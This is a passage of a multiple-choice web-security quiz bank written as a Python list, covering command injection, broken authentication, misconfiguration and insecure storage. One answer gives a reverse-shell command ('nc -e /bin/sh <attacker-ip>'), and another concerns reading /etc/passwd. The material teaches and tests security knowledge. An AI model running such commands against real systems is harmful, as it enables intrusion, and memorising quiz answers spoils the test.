                "text": "What is the difference between Command Injection and Code Injection?",
                "type": "multiple_choice",
                "topic": "Command Injection",
                "difficulty": "Medium",
                "skill_focus": "Concept",
                "explanation": "Command Injection executes OS commands; Code Injection executes application code (e.g. PHP, Python).",
                "options": [
                    {"text": "They are the same", "is_correct": False},
                    {"text": "Command Injection executes OS commands; Code Injection executes app code", "is_correct": True},
                    {"text": "Code injection is for databases", "is_correct": False},
                    {"text": "Command injection is client-side", "is_correct": False}
                ]
            },
            {
                "text": "Which of these functions in PHP is vulnerable to command injection if input is not sanitized?",
                "type": "multiple_choice",
                "topic": "Command Injection",
                "difficulty": "Medium",
                "skill_focus": "Exploitation",
                "explanation": "`system()` executes an external program and displays the output.",
                "options": [
                    {"text": "echo", "is_correct": False},
                    {"text": "system()", "is_correct": True},
                    {"text": "print", "is_correct": False},
                    {"text": "var_dump", "is_correct": False}
                ]
            },
            {
                "text": "What does the command `whoami` return?",
                "type": "multiple_choice",
                "topic": "Command Injection",
                "difficulty": "Easy",
                "skill_focus": "Exploitation",
                "explanation": "It prints the username associated with the current effective user ID.",
                "options": [
                    {"text": "The computer's name", "is_correct": False},
                    {"text": "The current user", "is_correct": True},
                    {"text": "The IP address", "is_correct": False},
                    {"text": "The current directory", "is_correct": False}
                ]
            },
            {
                "text": "Which character is used to separate commands in Windows command line?",
                "type": "multiple_choice",
                "topic": "Command Injection",
                "difficulty": "Medium",
                "skill_focus": "Exploitation",
                "explanation": "`&` or `&&` are used to chain commands in Windows CMD.",
                "options": [
                    {"text": ";", "is_correct": False},
                    {"text": "&", "is_correct": True},
                    {"text": "#", "is_correct": False},
                    {"text": "$", "is_correct": False}
                ]
            },
            {
                "text": "What is 'Blind' Command Injection?",
                "type": "multiple_choice",
                "topic": "Command Injection",
                "difficulty": "Hard",
                "skill_focus": "Concept",
                "explanation": "The output of the command is not returned to the user.",
                "options": [
                    {"text": "Injecting commands without looking", "is_correct": False},
                    {"text": "Command executes but no output is shown", "is_correct": True},
                    {"text": "Command is encrypted", "is_correct": False},
                    {"text": "Command runs in background", "is_correct": False}
                ]
            },
            {
                "text": "How can you detect blind command injection?",
                "type": "multiple_choice",
                "topic": "Command Injection",
                "difficulty": "Hard",
                "skill_focus": "Exploitation",
                "explanation": "Using time-based commands like `sleep` or `ping` to cause a delay.",
                "options": [
                    {"text": "By reading the error logs", "is_correct": False},
                    {"text": "Using time delays (sleep/ping)", "is_correct": True},
                    {"text": "Guessing the password", "is_correct": False},
                    {"text": "Checking the source code", "is_correct": False}
                ]
            },
            {
                "text": "Which function is safer to use in Python to avoid shell injection?",
                "type": "multiple_choice",
                "topic": "Command Injection",
                "difficulty": "Medium",
                "skill_focus": "Prevention",
                "explanation": "`subprocess.run` with `shell=False` (default) treats arguments as data, not commands.",
                "options": [
                    {"text": "os.system()", "is_correct": False},
                    {"text": "subprocess.run() with shell=False", "is_correct": True},
                    {"text": "os.popen()", "is_correct": False},
                    {"text": "exec()", "is_correct": False}
                ]
            },
            {
                "text": "What does `cat /etc/passwd` do in a Linux injection?",
                "type": "multiple_choice",
                "topic": "Command Injection",
                "difficulty": "Medium",
                "skill_focus": "Exploitation",
                "explanation": "It reads the file containing user account information.",
                "options": [
                    {"text": "Changes the password", "is_correct": False},
                    {"text": "Reads user account list", "is_correct": True},
                    {"text": "Deletes the password file", "is_correct": False},
                    {"text": "Creates a new user", "is_correct": False}
                ]
            },
            {
                "text": "What is the purpose of the `ping` command in injection testing?",
                "type": "multiple_choice",
                "topic": "Command Injection",
                "difficulty": "Easy",
                "skill_focus": "Exploitation",
                "explanation": "It is often used to test for execution and network connectivity.",
                "options": [
                    {"text": "To crash the server", "is_correct": False},
                    {"text": "To test connectivity/execution", "is_correct": True},
                    {"text": "To play a game", "is_correct": False},
                    {"text": "To encrypt data", "is_correct": False}
                ]
            },
            {
                "text": "Which character works as a command separator in both Linux and Windows?",
                "type": "multiple_choice",
                "topic": "Command Injection",
                "difficulty": "Medium",
                "skill_focus": "Exploitation",
                "explanation": "`|` (pipe) works in both to pipe output.",
                "options": [
                    {"text": ";", "is_correct": False},
                    {"text": "|", "is_correct": True},
                    {"text": "%", "is_correct": False},
                    {"text": "/", "is_correct": False}
                ]
            },
            {
                "text": "What is 'Argument Injection'?",
                "type": "multiple_choice",
                "topic": "Command Injection",
                "difficulty": "Hard",
                "skill_focus": "Concept",
                "explanation": "Injecting arguments into a command rather than a new command (e.g. injecting flags to a binary).",
                "options": [
                    {"text": "Injecting into a function argument", "is_correct": False},
                    {"text": "Injecting parameters/flags to an existing command", "is_correct": True},
                    {"text": "Arguing with the server", "is_correct": False},
                    {"text": "Injecting SQL into arguments", "is_correct": False}
                ]
            },
            {
                "text": "Why is `eval()` dangerous?",
                "type": "multiple_choice",
                "topic": "Command Injection",
                "difficulty": "Easy",
                "skill_focus": "Concept",
                "explanation": "`eval()` executes a string as code, leading to Code Injection (and potentially command execution).",
                "options": [
                    {"text": "It is slow", "is_correct": False},
                    {"text": "It executes arbitrary code", "is_correct": True},
                    {"text": "It returns wrong values", "is_correct": False},
                    {"text": "It is deprecated", "is_correct": False}
                ]
            },
            {
                "text": "Which usage is vulnerable: `grep $pattern file.txt`?",
                "type": "multiple_choice",
                "topic": "Command Injection",
                "difficulty": "Medium",
                "skill_focus": "Exploitation",
                "explanation": "If `$pattern` is not quoted or sanitized, command injection is possible.",
                "options": [
                    {"text": "The one with hardcoded pattern", "is_correct": False},
                    {"text": "The one taking unsanitized user input in shell", "is_correct": True},
                    {"text": "Using grep inside a script", "is_correct": False},
                    {"text": "Using grep recursively", "is_correct": False}
                ]
            },
            {
                "text": "How can you trigger a reverse shell via command injection?",
                "type": "multiple_choice",
                "topic": "Command Injection",
                "difficulty": "Hard",
                "skill_focus": "Exploitation",
                "explanation": "Using tools like `nc` (netcat) or bash redirection to connect back to the attacker.",
                "options": [
                    {"text": "Using `ls`", "is_correct": False},
                    {"text": "Using `nc -e /bin/sh <attacker-ip>`", "is_correct": True},
                    {"text": "Using `cd`", "is_correct": False},
                    {"text": "Using `cat`", "is_correct": False}
                ]
            },
            {
                "text": "What is the best defense against OS Command Injection?",
                "type": "multiple_choice",
                "topic": "Command Injection",
                "difficulty": "Medium",
                "skill_focus": "Prevention",
                "explanation": "Avoid calling OS commands directly; use language-specific APIs.",
                "options": [
                    {"text": "Sanitization", "is_correct": False},
                    {"text": "Avoid calling OS commands; use libraries", "is_correct": True},
                    {"text": "Running as root", "is_correct": False},
                    {"text": "Obfuscation", "is_correct": False}
                ]
            },
            {
                "text": "If you must use OS commands, what should you do?",
                "type": "multiple_choice",
                "topic": "Command Injection",
                "difficulty": "Medium",
                "skill_focus": "Prevention",
                "explanation": "Use whitelist validation and parameterized APIs (e.g. execve array w/o shell).",
                "options": [
                    {"text": "Use regex only", "is_correct": False},
                    {"text": "Use parameterized APIs and whitelist validation", "is_correct": True},
                    {"text": "Use blacklist validation", "is_correct": False},
                    {"text": "Encode input to Base64", "is_correct": False}
                ]
            },
            {
                "text": "What does `$()` do in a shell command?",
                "type": "multiple_choice",
                "topic": "Command Injection",
                "difficulty": "Medium",
                "skill_focus": "Exploitation",
                "explanation": "Command substitution; it executes the command inside and replaces it with the output.",
                "options": [
                    {"text": "Calculates math", "is_correct": False},
                    {"text": "Executes the command inside (Command Substitution)", "is_correct": True},
                    {"text": "Comments the line", "is_correct": False},
                    {"text": "Variables definition", "is_correct": False}
                ]
            },
            {
                "text": "What is the specialized term for injecting commands into a serialized object?",
                "type": "multiple_choice",
                "topic": "Command Injection",
                "difficulty": "Hard",
                "skill_focus": "Concept",
                "explanation": "Insecure Deserialization often leads to RCE (Remote Code/Command Execution).",
                "options": [
                    {"text": "Object Injection", "is_correct": False},
                    {"text": "Insecure Deserialization (leading to RCE)", "is_correct": True},
                    {"text": "Class Injection", "is_correct": False},
                    {"text": "Method Injection", "is_correct": False}
                ]
            },

            # 5. Broken Authentication (20 Questions)
            {
                "text": "Which practice is considered 'Broken Authentication'?",
                "type": "multiple_choice",
                "topic": "Broken Authentication",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "Allowing weak passwords or default credentials.",
                "options": [
                    {"text": "Enforcing 2FA", "is_correct": False},
                    {"text": "Allowing default or weak passwords", "is_correct": True},
                    {"text": "Using salted hashes", "is_correct": False},
                    {"text": "Logging out inactive users", "is_correct": False}
                ]
            },
            {
                "text": "What is 'Credential Stuffing'?",
                "type": "multiple_choice",
                "topic": "Broken Authentication",
                "difficulty": "Medium",
                "skill_focus": "Concept",
                "explanation": "Using automated injection of breached username/password pairs to gain access to user accounts.",
                "options": [
                    {"text": "Filling the database with credentials", "is_correct": False},
                    {"text": "Trying breached credentials from other sites", "is_correct": True},
                    {"text": "Creating fake accounts", "is_correct": False},
                    {"text": "Stealing cookies", "is_correct": False}
                ]
            },
            {
                "text": "How should passwords be stored in a database?",
                "type": "multiple_choice",
                "topic": "Broken Authentication",
                "difficulty": "Easy",
                "skill_focus": "Prevention",
                "explanation": "Passwords should be salted and hashed using a strong algorithm (e.g., Argon2, bcrypt).",
                "options": [
                    {"text": "Plain text", "is_correct": False},
                    {"text": "Encrypted", "is_correct": False},
                    {"text": "Salted and Hashed", "is_correct": True},
                    {"text": "Base64 Encoded", "is_correct": False}
                ]
            },
            {
                "text": "What prevents Brute Force attacks?",
                "type": "multiple_choice",
                "topic": "Broken Authentication",
                "difficulty": "Medium",
                "skill_focus": "Prevention",
                "explanation": "Account lockout policies or rate limiting deter brute force attempts.",
                "options": [
                    {"text": "Shorter passwords", "is_correct": False},
                    {"text": "Rate Limiting / Account Lockout", "is_correct": True},
                    {"text": "Using HTTP", "is_correct": False},
                    {"text": "Hiding the login page", "is_correct": False}
                ]
            },
            {
                "text": "Session ID should be...?",
                "type": "multiple_choice",
                "topic": "Broken Authentication",
                "difficulty": "Easy",
                "skill_focus": "Prevention",
                "explanation": "Session IDs must be long, random, and unpredictable.",
                "options": [
                    {"text": "Sequential", "is_correct": False},
                    {"text": "Based on username", "is_correct": False},
                    {"text": "Long, random, and unpredictable", "is_correct": True},
                    {"text": "Short and easy to remember", "is_correct": False}
                ]
            },
            {
                "text": "What is 'Session Fixation'?",
                "type": "multiple_choice",
                "topic": "Broken Authentication",
                "difficulty": "Medium",
                "skill_focus": "Concept",
                "explanation": "Attacker sets a user's session ID to one known to the attacker.",
                "options": [
                    {"text": "Fixing a broken session", "is_correct": False},
                    {"text": "Attacker provides a session ID for victim to use", "is_correct": True},
                    {"text": "Session timing out", "is_correct": False},
                    {"text": "Session stored in URL", "is_correct": False}
                ]
            },
            {
                "text": "Why is it important to invalidate session on logout?",
                "type": "multiple_choice",
                "topic": "Broken Authentication",
                "difficulty": "Easy",
                "skill_focus": "Prevention",
                "explanation": "To prevent session reuse if the session ID is stolen later.",
                "options": [
                    {"text": "To clear browser history", "is_correct": False},
                    {"text": "To prevent session reuse", "is_correct": True},
                    {"text": "To save server memory", "is_correct": False},
                    {"text": "To reset the password", "is_correct": False}
                ]
            },
            {
                "text": "Which is a weak method for 2FA?",
                "type": "multiple_choice",
                "topic": "Broken Authentication",
                "difficulty": "Medium",
                "skill_focus": "Knowledge",
                "explanation": "SMS is considered weak due to SIM swapping attacks.",
                "options": [
                    {"text": "Authenticator App", "is_correct": False},
                    {"text": "SMS", "is_correct": True},
                    {"text": "Hardware Key (YubiKey)", "is_correct": False},
                    {"text": "Push Notification", "is_correct": False}
                ]
            },
            {
                "text": "What is the recommended maximum session idle timeout for high security apps?",
                "type": "multiple_choice",
                "topic": "Broken Authentication",
                "difficulty": "Hard",
                "skill_focus": "Best Practice",
                "explanation": "Short timeouts (e.g. 15-30 mins) reduce the window of opportunity for attackers.",
                "options": [
                    {"text": "1 week", "is_correct": False},
                    {"text": "15-30 minutes", "is_correct": True},
                    {"text": "24 hours", "is_correct": False},
                    {"text": "Never", "is_correct": False}
                ]
            },
            {
                "text": "What allows attackers to enumerate valid usernames?",
                "type": "multiple_choice",
                "topic": "Broken Authentication",
                "difficulty": "Medium",
                "skill_focus": "Exploitation",
                "explanation": "Different error messages for 'User not found' vs 'Wrong password' allow enumeration.",
                "options": [
                    {"text": "Generic error messages", "is_correct": False},
                    {"text": "Distinct error messages (e.g. 'User not found')", "is_correct": True},
                    {"text": "Using CAPTCHA", "is_correct": False},
                    {"text": "Rate limiting", "is_correct": False}
                ]
            },
            {
                "text": "Where should session IDs NOT be stored?",
                "type": "multiple_choice",
                "topic": "Broken Authentication",
                "difficulty": "Medium",
                "skill_focus": "Prevention",
                "explanation": "URLs are logged in history, proxy logs, and referer headers, leaking the ID.",
                "options": [
                    {"text": "Secure Cookies", "is_correct": False},
                    {"text": "URL parameters", "is_correct": True},
                    {"text": "Local Storage (controversial but better than URL)", "is_correct": False},
                    {"text": "Memory", "is_correct": False}
                ]
            },
            {
                "text": "What is the main risk of 'Default Credentials'?",
                "type": "multiple_choice",
                "topic": "Broken Authentication",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "They are publicly known and easily exploited by attackers.",
                "options": [
                    {"text": "They are hard to memorize", "is_correct": False},
                    {"text": "They are publicly known", "is_correct": True},
                    {"text": "They are too long", "is_correct": False},
                    {"text": "They expire quickly", "is_correct": False}
                ]
            },
            {
                "text": "What does MFA stand for?",
                "type": "multiple_choice",
                "topic": "Broken Authentication",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "Multi-Factor Authentication.",
                "options": [
                    {"text": "Multi-Form Access", "is_correct": False},
                    {"text": "Multi-Factor Authentication", "is_correct": True},
                    {"text": "Main File Authentication", "is_correct": False},
                    {"text": "Multiple Folder Access", "is_correct": False}
                ]
            },
            {
                "text": "Which factor category does a fingerprint fall into?",
                "type": "multiple_choice",
                "topic": "Broken Authentication",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "Something you are (Biometrics).",
                "options": [
                    {"text": "Something you know", "is_correct": False},
                    {"text": "Something you have", "is_correct": False},
                    {"text": "Something you are", "is_correct": True},
                    {"text": "Something you do", "is_correct": False}
                ]
            },
            {
                "text": "What is 'Password Spraying'?",
                "type": "multiple_choice",
                "topic": "Broken Authentication",
                "difficulty": "Medium",
                "skill_focus": "Exploitation",
                "explanation": "Trying a few common passwords against many accounts to avoid lockout.",
                "options": [
                    {"text": "Guessing many passwords for one account", "is_correct": False},
                    {"text": "Guessing a few passwords against many accounts", "is_correct": True},
                    {"text": "Emailing passwords to users", "is_correct": False},
                    {"text": "Resetting everyone's password", "is_correct": False}
                ]
            },
            {
                "text": "How long should a temporary password reset token be valid?",
                "type": "multiple_choice",
                "topic": "Broken Authentication",
                "difficulty": "Medium",
                "skill_focus": "Best Practice",
                "explanation": "Short duration (e.g. 10-20 minutes) limits the attack window.",
                "options": [
                    {"text": "Forever", "is_correct": False},
                    {"text": "24 hours", "is_correct": False},
                    {"text": "Short duration (e.g. 20 minutes)", "is_correct": True},
                    {"text": "1 minute", "is_correct": False}
                ]
            },
            {
                "text": "What vulnerability involves the attacker waiting for a user to log in and using their valid session?",
                "type": "multiple_choice",
                "topic": "Broken Authentication",
                "difficulty": "Medium",
                "skill_focus": "Exploitation",
                "explanation": "Session Hijacking.",
                "options": [
                    {"text": "Phishing", "is_correct": False},
                    {"text": "Session Hijacking", "is_correct": True},
                    {"text": "SQL Injection", "is_correct": False},
                    {"text": "XSS", "is_correct": False}
                ]
            },
            {
                "text": "Is 'admin' a secure username?",
                "type": "multiple_choice",
                "topic": "Broken Authentication",
                "difficulty": "Easy",
                "skill_focus": "Best Practice",
                "explanation": "It is the most common username guessed by attackers.",
                "options": [
                    {"text": "Yes", "is_correct": False},
                    {"text": "No, it is too common/predictable", "is_correct": True},
                    {"text": "Yes, if password is strong", "is_correct": False},
                    {"text": "No, it is too short", "is_correct": False}
                ]
            },
            {
                "text": "When should the session ID be changed (rotated)?",
                "type": "multiple_choice",
                "topic": "Broken Authentication",
                "difficulty": "Medium",
                "skill_focus": "Prevention",
                "explanation": "Upon successful login (and privilege change) to prevent session fixation.",
                "options": [
                    {"text": "On every page load", "is_correct": False},
                    {"text": "After successful login", "is_correct": True},
                    {"text": "Never", "is_correct": False},
                    {"text": "When user clicks a button", "is_correct": False}
                ]
            },
            {
                "text": "What is the risk of allowing concurrent logins?",
                "type": "multiple_choice",
                "topic": "Broken Authentication",
                "difficulty": "Hard",
                "skill_focus": "Policy",
                "explanation": "It makes it harder to detect if an account is compromised (attacker logged in at same time as user).",
                "options": [
                    {"text": "Server overload", "is_correct": False},
                    {"text": "Harder to detect compromise", "is_correct": True},
                    {"text": "Database locks", "is_correct": False},
                    {"text": "None", "is_correct": False}
                ]
            },

            # 6. Security Misconfiguration (20 Questions)
            {
                "text": "What is a common Security Misconfiguration?",
                "type": "multiple_choice",
                "topic": "Security Misconfiguration",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "Leaving default accounts/passwords or unnecessary features enabled.",
                "options": [
                    {"text": "Complex passwords", "is_correct": False},
                    {"text": "Default accounts and passwords", "is_correct": True},
                    {"text": "Updated software", "is_correct": False},
                    {"text": "Firewall enabled", "is_correct": False}
                ]
            },
            {
                "text": "What information should error messages reveal to users?",
                "type": "multiple_choice",
                "topic": "Security Misconfiguration",
                "difficulty": "Easy",
                "skill_focus": "Best Practice",
                "explanation": "Generic messages. Detailed errors (stack traces) leak info to attackers.",
                "options": [
                    {"text": "Full stack trace", "is_correct": False},
                    {"text": "Database version", "is_correct": False},
                    {"text": "Generic error message", "is_correct": True},
                    {"text": "Server path", "is_correct": False}
                ]
            },
            {
                "text": "Why is 'Directory Listing' dangerous enabled?",
                "type": "multiple_choice",
                "topic": "Security Misconfiguration",
                "difficulty": "Easy",
                "skill_focus": "Exploitation",
                "explanation": "It allows attackers to see all files in a directory, potentially finding sensitive files.",
                "options": [
                    {"text": "It slows down the server", "is_correct": False},
                    {"text": "It reveals file structure and sensitive files", "is_correct": True},
                    {"text": "It deletes files", "is_correct": False},
                    {"text": "It looks ugly", "is_correct": False}
                ]
            },
            {
                "text": "Leaving debug features enabled in production is...?",
                "type": "multiple_choice",
                "topic": "Security Misconfiguration",
                "difficulty": "Medium",
                "skill_focus": "Best Practice",
                "explanation": "A security misconfiguration leading to information leakage.",
                "options": [
                    {"text": "Helpful for users", "is_correct": False},
                    {"text": "A Security Misconfiguration", "is_correct": True},
                    {"text": "Required for performance", "is_correct": False},
                    {"text": "Harmless", "is_correct": False}
                ]
            },
            {
                "text": "What is the principle of 'Least Privilege'?",
                "type": "multiple_choice",
                "topic": "Security Misconfiguration",
                "difficulty": "Medium",
                "skill_focus": "Concept",
                "explanation": "Users and processes should only have the permissions necessary to perform their function.",
                "options": [
                    {"text": "Giving everyone admin rights", "is_correct": False},
                    {"text": "Granting only necessary permissions", "is_correct": True},
                    {"text": "Blocking all access", "is_correct": False},
                    {"text": "Using guest accounts", "is_correct": False}
                ]
            },
            {
                "text": "Which HTTP header is often missing in misconfigured servers?",
                "type": "multiple_choice",
                "topic": "Security Misconfiguration",
                "difficulty": "Medium",
                "skill_focus": "Prevention",
                "explanation": "Security headers like HSTS, CSP, X-Frame-Options are often missed.",
                "options": [
                    {"text": "Date", "is_correct": False},
                    {"text": "Content-Type", "is_correct": False},
                    {"text": "Strict-Transport-Security (HSTS)", "is_correct": True},
                    {"text": "Host", "is_correct": False}
                ]
            },
            {
                "text": "Use of outdated software components is associated with?",
                "type": "multiple_choice",
                "topic": "Security Misconfiguration",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "Using components with known vulnerabilities is a form of misconfiguration/maintenance failure.",
                "options": [
                    {"text": "Vulnerable and Outdated Components", "is_correct": True},
                    {"text": "SQL Injection", "is_correct": False},
                    {"text": "XSS", "is_correct": False},
                    {"text": "Phishing", "is_correct": False}
                ]
            },
            {
                "text": "What should be done with sample apps installed by default on web servers?",
                "type": "multiple_choice",
                "topic": "Security Misconfiguration",
                "difficulty": "Easy",
                "skill_focus": "Best Practice",
                "explanation": "They should be removed as they contain known vulnerabilities and are not needed.",
                "options": [
                    {"text": "Keep them for reference", "is_correct": False},
                    {"text": "Remove them", "is_correct": True},
                    {"text": "Password protect them", "is_correct": False},
                    {"text": "Rename them", "is_correct": False}
                ]
            },
            {
                "text": "Why is it important to change default keys and passwords?",
                "type": "multiple_choice",
                "topic": "Security Misconfiguration",
                "difficulty": "Easy",
                "skill_focus": "Prevention",
                "explanation": "Attackers check for default credentials first.",
                "options": [
                    {"text": "To confuse customization", "is_correct": False},
                    {"text": "To prevent unauthorized access via known defaults", "is_correct": True},
                    {"text": "It is not important", "is_correct": False},
                    {"text": "To reset the warranty", "is_correct": False}
                ]
            },
            {
                "text": "What does CORS stands for?",
                "type": "multiple_choice",
                "topic": "Security Misconfiguration",
                "difficulty": "Medium",
                "skill_focus": "Knowledge",
                "explanation": "Cross-Origin Resource Sharing.",
                "options": [
                    {"text": "Cross-Origin Resource Sharing", "is_correct": True},
                    {"text": "Common Origin Request System", "is_correct": False},
                    {"text": "Central Origin Router Service", "is_correct": False},
                    {"text": "Cross Object Request Security", "is_correct": False}
                ]
            },
            {
                "text": "Which CORS header value is dangerous if used blindly?",
                "type": "multiple_choice",
                "topic": "Security Misconfiguration",
                "difficulty": "Medium",
                "skill_focus": "Exploitation",
                "explanation": "`Access-Control-Allow-Origin: *` allows any site to access resources (if credentials not included, but bad practice).",
                "options": [
                    {"text": "null", "is_correct": False},
                    {"text": "* (Wildcard)", "is_correct": True},
                    {"text": "The specific domain", "is_correct": False},
                    {"text": "None", "is_correct": False}
                ]
            },
            {
                "text": "What is 'Clickjacking'?",
                "type": "multiple_choice",
                "topic": "Security Misconfiguration",
                "difficulty": "Medium",
                "skill_focus": "Concept",
                "explanation": "Tricking a user into clicking something different from what they see, often via transparent iframes.",
                "options": [
                    {"text": "Hijacking the mouse cursor", "is_correct": False},
                    {"text": "Overlaying invisible frames to trick clicks", "is_correct": True},
                    {"text": "Stealing clicks for ads", "is_correct": False},
                    {"text": "Breaking the mouse", "is_correct": False}
                ]
            },
            {
                "text": "Which header prevents Clickjacking?",
                "type": "multiple_choice",
                "topic": "Security Misconfiguration",
                "difficulty": "Medium",
                "skill_focus": "Prevention",
                "explanation": "X-Frame-Options (or CSP frame-ancestors).",
                "options": [
                    {"text": "X-XSS-Protection", "is_correct": False},
                    {"text": "X-Frame-Options", "is_correct": True},
                    {"text": "X-Content-Type-Options", "is_correct": False},
                    {"text": "Strict-Transport-Security", "is_correct": False}
                ]
            },
            {
                "text": "What does disabling unnecessary ports/services achieve?",
                "type": "multiple_choice",
                "topic": "Security Misconfiguration",
                "difficulty": "Easy",
                "skill_focus": "Prevention",
                "explanation": "It reduces the attack surface.",
                "options": [
                    {"text": "Saves electricity", "is_correct": False},
                    {"text": "Reduces attack surface", "is_correct": True},
                    {"text": "Increases internet speed", "is_correct": False},
                    {"text": "Makes server boot faster", "is_correct": False}
                ]
            },
            {
                "text": "Using HTTP instead of HTTPS is a...",
                "type": "multiple_choice",
                "topic": "Security Misconfiguration",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "Misconfiguration failing to protect data in transit.",
                "options": [
                    {"text": "Good practice", "is_correct": False},
                    {"text": "Security Misconfiguration", "is_correct": True},
                    {"text": "Faster option", "is_correct": False},
                    {"text": "Cheaper option", "is_correct": False}
                ]
            },
            {
                "text": "What is the risk of exposed '.git' folder?",
                "type": "multiple_choice",
                "topic": "Security Misconfiguration",
                "difficulty": "Medium",
                "skill_focus": "Exploitation",
                "explanation": "It allows attackers to download the entire source code and history.",
                "options": [
                    {"text": "Server crash", "is_correct": False},
                    {"text": "Source code disclosure", "is_correct": True},
                    {"text": "Git commit injection", "is_correct": False},
                    {"text": "None", "is_correct": False}
                ]
            },
            {
                "text": "Which file is used to configure access to directories in Apache?",
                "type": "multiple_choice",
                "topic": "Security Misconfiguration",
                "difficulty": "Medium",
                "skill_focus": "Knowledge",
                "explanation": ".htaccess",
                "options": [
                    {"text": "config.php", "is_correct": False},
                    {"text": ".htaccess", "is_correct": True},
                    {"text": "web.config", "is_correct": False},
                    {"text": "nginx.conf", "is_correct": False}
                ]
            },
            {
                "text": "Misconfigured permissions on AWS S3 buckets often lead to?",
                "type": "multiple_choice",
                "topic": "Security Misconfiguration",
                "difficulty": "Medium",
                "skill_focus": "Exploitation",
                "explanation": "Data leakage/breach where private data is public.",
                "options": [
                    {"text": "DDoS", "is_correct": False},
                    {"text": "Data Leakage", "is_correct": True},
                    {"text": "Ransomware", "is_correct": False},
                    {"text": "Phishing", "is_correct": False}
                ]
            },
            {
                "text": "What is 'Hardcoded Secrets'?",
                "type": "multiple_choice",
                "topic": "Security Misconfiguration",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "Storing API keys, passwords, etc. in the source code.",
                "options": [
                    {"text": "Secrets that are hard to guess", "is_correct": False},
                    {"text": "Credentials stored in source code", "is_correct": True},
                    {"text": "Encrypted secrets", "is_correct": False},
                    {"text": "Secrets in hardware", "is_correct": False}
                ]
            },
            {
                "text": "Automated scanning tools help find?",
                "type": "multiple_choice",
                "topic": "Security Misconfiguration",
                "difficulty": "Easy",
                "skill_focus": "Prevention",
                "explanation": "They are efficient at finding common misconfigurations.",
                "options": [
                    {"text": "Logic flaws", "is_correct": False},
                    {"text": "Common misconfigurations", "is_correct": True},
                    {"text": "Zero-days", "is_correct": False},
                    {"text": "Phishing emails", "is_correct": False}
                ]
            },
            # 7. Insecure Storage (20 Questions)
            {
                "text": "What is the primary risk of Insecure Storage?",
                "type": "multiple_choice",
                "topic": "Insecure Storage",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "Sensitive data may be disclosed if not properly protected at rest.",
                "options": [
                    {"text": "Slow disk access", "is_correct": False},
                    {"text": "Unauthorized disclosure of sensitive data", "is_correct": True},
                    {"text": "Data being too large", "is_correct": False},
                    {"text": "Disk failure", "is_correct": False}
                ]
            },
            {
                "text": "Where should encryption keys be stored?",
                "type": "multiple_choice",
                "topic": "Insecure Storage",
                "difficulty": "Medium",
                "skill_focus": "Best Practice",
                "explanation": "Keys should be stored securely, separate from the data they encrypt (e.g., in a KMS).",
                "options": [
                    {"text": "In the same database table", "is_correct": False},
                    {"text": "In a secure Key Management System (KMS)", "is_correct": True},
                    {"text": "In the application source code", "is_correct": False},
                    {"text": "In a public Git repository", "is_correct": False}
                ]
            },
            {
                "text": "Which of these is a weak hashing algorithm for passwords?",
                "type": "multiple_choice",
                "topic": "Insecure Storage",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "MD5 is fast and has known collisions, making it unsuitable for password hashing.",
                "options": [
                    {"text": "Argon2", "is_correct": False},
                    {"text": "BCrypt", "is_correct": False},
                    {"text": "MD5", "is_correct": True},
                    {"text": "SCrypt", "is_correct": False}
                ]
            },
            {
                "text": "What is 'Salting' in the context of password storage?",
                "type": "multiple_choice",
                "topic": "Insecure Storage",
                "difficulty": "Easy",
                "skill_focus": "Concept",
                "explanation": "Adding unique random data to each password before hashing to defeat rainbow tables.",
                "options": [
                    {"text": "Enciphering the password", "is_correct": False},
                    {"text": "Adding random data to the input", "is_correct": True},
                    {"text": "Storing passwords in a salt shaker", "is_correct": False},
                    {"text": "Compressing the password", "is_correct": False}
                ]
            },
            {
                "text": "Storing sensitive data in browser LocalStorage is risky because...?",
                "type": "multiple_choice",
                "topic": "Insecure Storage",
                "difficulty": "Medium",
                "skill_focus": "Knowledge",
                "explanation": "LocalStorage is accessible via JavaScript on the same origin, making it vulnerable to XSS.",
                "options": [
                    {"text": "It is too small", "is_correct": False},
                    {"text": "It is accessible via JavaScript (vulnerable to XSS)", "is_correct": True},
                    {"text": "It expires too quickly", "is_correct": False},
                    {"text": "It requires a database", "is_correct": False}
                ]
            },
            {
                "text": "What is 'Hardcoded' credentials?",
                "type": "multiple_choice",
                "topic": "Insecure Storage",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "Embedding passwords or API keys directly in the source code.",
                "options": [
                    {"text": "Strong passwords", "is_correct": False},
                    {"text": "Passwords embedded in source code", "is_correct": True},
                    {"text": "Encrypted passwords", "is_correct": False},
                    {"text": "Passwords on a sticky note", "is_correct": False}
                ]
            },
            {
                "text": "Which flag should be used on sensitive cookies to prevent transmission over unencrypted channels?",
                "type": "multiple_choice",
                "topic": "Insecure Storage",
                "difficulty": "Easy",
                "skill_focus": "Prevention",
                "explanation": "The 'Secure' flag ensures the cookie is only sent over HTTPS.",
                "options": [
                    {"text": "HttpOnly", "is_correct": False},
                    {"text": "Secure", "is_correct": True},
                    {"text": "SameSite", "is_correct": False},
                    {"text": "Private", "is_correct": False}
                ]
            },
            {
                "text": "What is the purpose of PII protection?",
                "type": "multiple_choice",
                "topic": "Insecure Storage",
                "difficulty": "Medium",
                "skill_focus": "Concept",
                "explanation": "To protect Personally Identifiable Information from unauthorized access.",
                "options": [
                    {"text": "To increase database speed", "is_correct": False},
                    {"text": "To protect Personally Identifiable Information", "is_correct": True},
                    {"text": "To compress files", "is_correct": False},
                    {"text": "To hide images", "is_correct": False}
                ]
            },
            {
                "text": "Which of these is a secure way to store a secret key for a cloud application?",
                "type": "multiple_choice",
                "topic": "Insecure Storage",
                "difficulty": "Medium",
                "skill_focus": "Tools",
                "explanation": "Environment variables or Secret Managers (like AWS Secrets Manager, HashiCorp Vault).",
                "options": [
                    {"text": "In a config file in Git", "is_correct": False},
                    {"text": "Using a Secret Manager service", "is_correct": True},
                    {"text": "In the README.md", "is_correct": False},
                    {"text": "As a comment in HTML", "is_correct": False}
                ]
            },
            {
                "text": "What is 'Data at Rest'?",
                "type": "multiple_choice",
